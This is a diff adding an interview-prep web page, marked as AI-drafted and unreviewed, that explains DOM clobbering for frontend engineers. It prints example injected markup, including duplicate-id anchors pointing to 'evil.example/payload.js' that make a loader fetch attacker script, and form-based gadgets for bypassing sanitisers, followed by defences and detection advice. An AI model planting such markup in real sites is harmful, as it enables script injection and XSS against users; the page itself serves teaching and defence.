@@ -1,0 +1,55 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self'; img-src 'self' data:; base-uri 'none'; form-action 'none'">
+<title>What is DOM clobbering and how do attackers exploit named HTML elements to overwrite global variables? | InterviewGearUp</title>
+<meta name="description" content="DOM clobbering abuses the legacy behaviour where elements with id or name attributes become properties on window or document. An attacker who can inject…">
+<link rel="canonical" href="https://sadiqgpasha89.github.io/InterviewGearUp/q/fe-100.html">
+<meta property="og:title" content="What is DOM clobbering and how do attackers exploit named HTML elements to overwrite global variables? | InterviewGearUp">
+<meta property="og:description" content="DOM clobbering abuses the legacy behaviour where elements with id or name attributes become properties on window or document. An attacker who can inject…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://sadiqgpasha89.github.io/InterviewGearUp/q/fe-100.html">
+<meta name="color-scheme" content="light dark">
+<link rel="icon" href="../favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+<header class="top"><div class="top-in"><a class="brand" href="../"><span>InterviewGearUp</span></a></div></header>
+<main id="main" class="static-page">
+<p class="muted small-text"><a href="index.html">All questions with written answers</a></p>
+<h1>What is DOM clobbering and how do attackers exploit named HTML elements to overwrite global variables?</h1>
+<p class="muted small-text meta-line">Frontend engineer · Gear 3 (Senior) · Security · Difficulty: hard · AI-drafted, not yet reviewed by a person</p>
+<div class="short"><h4>In 30 seconds</h4>
+<p>DOM clobbering abuses the legacy behaviour where elements with id or name attributes become properties on window or document. An attacker who can inject harmless looking HTML (no script) can shadow global variables or object properties that code later reads, turning into script loading or XSS. Prevent it with sanitisation, explicit declarations and safe lookups.</p></div>
+<h4>Explained in depth</h4>
+<h4>The browser feature</h4>
+<p>Named access on the Window object: an element with <code>id=&quot;foo&quot;</code> becomes <code>window.foo</code>. Forms and some elements with <code>name</code> attributes become properties of <code>document</code> and of the <code>form</code> itself. This is legacy behaviour kept for compatibility.</p>
+<pre><code>&lt;img id=&quot;config&quot;&gt;
+&lt;script&gt;
+  // developer assumed a global config object, or that it is undefined and uses a default
+  const cfg = window.config || { url: &#39;/app.js&#39; };
+  loadScript(cfg.url);
+&lt;/script&gt;</code></pre>
+<p>With injected <code>&lt;img id=&quot;config&quot;&gt;</code>, <code>window.config</code> is now an element, truthy, so the default is skipped and <code>cfg.url</code> is <code>undefined</code>.</p>
+<h4>Escalating to code execution</h4>
+<p>Two elements with the same <code>id</code> create an <code>HTMLCollection</code>, and a named child gives a nested property:</p>
+<pre><code>&lt;a id=&quot;config&quot;&gt;&lt;/a&gt;
+&lt;a id=&quot;config&quot; name=&quot;url&quot; href=&quot;https://evil.example/payload.js&quot;&gt;&lt;/a&gt;</code></pre>
+<p><code>window.config.url</code> now resolves to the second anchor, and anchors stringify to their <code>href</code>, so <code>script.src = config.url</code> loads attacker code. Other gadgets: <code>&lt;form id=&quot;x&quot;&gt;&lt;input name=&quot;y&quot; value=&quot;...&quot;&gt;&lt;/form&gt;</code> gives <code>x.y.value</code>, overriding <code>document.cookie</code>, <code>document.getElementById</code> or <code>attributes</code>, and attacking sanitizer logic itself (forms with <code>name=&quot;attributes&quot;</code> break DOMPurify-style checks in old versions).</p>
+<h4>Why it matters</h4>
+<p>It bypasses filters that strip <code>&lt;script&gt;</code> and event handlers, because the injected markup is considered safe. Real world cases: bugs in Gmail AMP, Google Analytics, and multiple libraries and sanitiser bypasses.</p>
+<h4>Defences</h4>
+<ul><li><strong>Sanitise user HTML</strong> with DOMPurify (it removes dangerous names, and its <code>SANITIZE_DOM</code> option is on by default), and consider <strong>stripping <code>id</code> and <code>name</code></strong> from untrusted markup (<code>FORBID_ATTR</code>), or prefix them.</li><li><strong>Declare variables explicitly</strong> (<code>const</code>, <code>let</code>, <code>var</code>, module scope) rather than relying on globals; use <code>window.config = window.config ?? ...</code> only with type checks.</li><li><strong>Type check before use</strong>: <code>if (cfg instanceof HTMLElement)</code> rejects, or verify <code>typeof cfg.url === &#39;string&#39;</code> and a strict URL allow-list.</li><li>Avoid <code>window.x</code> and <code>document.x</code> lookups for application data; use <code>getElementById</code> intentionally, <code>Object.hasOwn</code>, and Maps for configuration.</li><li>Use <strong>Content Security Policy</strong> with nonces and <code>strict-dynamic</code>, Trusted Types (blocks injection into script sinks), <code>object-src &#39;none&#39;</code>, and <code>Object.freeze</code> on configuration.</li><li>Run code as ES modules (module scope does not expose variables on <code>window</code>) and avoid inline scripts reading global config.</li><li>Lint for implicit globals (<code>no-undef</code>, <code>no-implicit-globals</code>) and add tests that inject colliding ids.</li></ul>
+<h4>Detection</h4>
+<p>Security review of code that reads <code>window.*</code> or <code>document.*</code> properties near user-controlled HTML (comments, rich text, markdown rendering, email viewers, AMP), plus tools such as Burp DOM Invader which tests clobbering.</p>
+<h4>Likely follow-ups</h4>
+<ul><li>How can anchor elements with the same id clobber nested properties like config.url?</li><li>Why does DOMPurify still need the SANITIZE_NAMED_PROPS option sometimes?</li><li>Which code patterns are most vulnerable?</li></ul>
+<p><a class="btn primary" href="../#/q/fe-100">Practise this question in the app</a></p>
+<p class="small-text"><a href="https://github.com/sadiqgpasha89/InterviewGearUp/issues/new?template=content-feedback.yml&amp;title=%5BAnswer+feedback%5D+fe-100%3A+What+is+DOM+clobbering+and+how+do+attackers+exploit+named+HTML%E2%80%A6&amp;question-id=fe-100&amp;context=Frontend+engineer%2C+Gear+3%2C+topic%3A+Security%2C+content+version+1.+Link%3A+https%3A%2F%2Fsadiqgpasha89.github.io%2FInterviewGearUp%2Fq%2Ffe-100.html" rel="noopener noreferrer">Report a problem with this answer</a></p>
+</main>
+<footer class="foot"><p>Answers are study aids written to explain the ideas, not scripts to memorise. Verify anything you rely on. <a href="../">Open the app</a> · <a href="https://github.com/sadiqgpasha89/InterviewGearUp" rel="noopener noreferrer">Source on GitHub</a></p></footer>
+</body>
+</html>
